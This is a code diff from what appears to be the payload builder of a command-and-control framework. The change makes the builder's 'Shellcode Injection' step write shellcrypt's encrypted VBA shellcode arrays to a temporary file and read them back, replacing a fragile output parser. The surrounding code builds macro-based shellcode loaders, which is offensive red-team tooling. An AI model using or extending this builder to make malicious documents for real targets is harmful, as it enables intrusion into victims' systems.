@@ -3333,15 +3333,22 @@ generated if none have been entered.""",
                         )
 
                     else:  # Shellcode Injection
-                        # Convert shellcode to VBA format using shellcrypt
-                        # First, generate the VBA-formatted shellcode
+                        # Convert shellcode to VBA format using shellcrypt.
+                        # Use -o <temp_file> so shellcrypt writes raw VBA directly to
+                        # disk instead of via Rich console.print, which wraps long
+                        # lines at terminal width when stdout is piped and would
+                        # split "key = Array(...)" across lines, breaking the output.
+                        vba_fd, vba_tmp = tempfile.mkstemp(suffix='.vba')
+                        os.close(vba_fd)
+
                         cmd = [
                             "python",
                             shellcrypt_path,
                             "-i", mythic_shellcode_path,
                             "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                             "-f", "vba",
-                            "-a", "shellcode"
+                            "-a", "shellcode",
+                            "-o", vba_tmp,
                         ]
 
                         if self.get_parameter("2.2 Encryption Key") != "NONE":
@@ -3350,50 +3357,12 @@ generated if none have been entered.""",
                         if self.get_parameter("2.0 Compression Type") != "NONE":
                             cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
 
-                        # Run shellcrypt to get VBA shellcode
-                        shellcode_output = subprocess.check_output(cmd, text=True)
-                        output += f"[DEBUG] Shellcrypt raw output length: {len(shellcode_output)} bytes\n"
+                        subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
 
-                        # Parse shellcrypt output to extract only key and shellcode arrays
-                        shellcode_vba = ""
-                        lines = shellcode_output.split('\n')
-                        in_key = False
-                        in_shellcode = False
-                        key_lines = []
-                        shellcode_lines = []
+                        shellcode_vba = open(vba_tmp, 'r').read()
+                        os.unlink(vba_tmp)
 
-                        for line in lines:
-                            # Capture key array
-                            if 'key = Array' in line:
-                                in_key = True
-                                in_shellcode = False
-                                key_lines.append(line.strip())
-                            elif in_key:
-                                if line.strip().endswith(')'):
-                                    key_lines.append(line.strip())
-                                    in_key = False
-                                elif line.strip():
-                                    key_lines.append(line.strip())
-
-                            # Capture shellcode array
-                            if 'shellcode = Array' in line:
-                                in_shellcode = True
-                                in_key = False
-                                shellcode_lines.append(line.strip())
-                            elif in_shellcode:
-                                if line.strip().endswith(')'):
-                                    shellcode_lines.append(line.strip())
-                                    in_shellcode = False
-                                elif line.strip():
-                                    shellcode_lines.append(line.strip())
-
-                        # Combine extracted lines
-                        if key_lines:
-                            shellcode_vba += ' '.join(key_lines) + '\n'
-                        if shellcode_lines:
-                            shellcode_vba += ' '.join(shellcode_lines) + '\n'
-
-                        output += f"[DEBUG] Parsed shellcode_vba length: {len(shellcode_vba)} bytes\n"
+                        output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
 
                         # Map loader selection to plugin parameter
                         loader_map = {
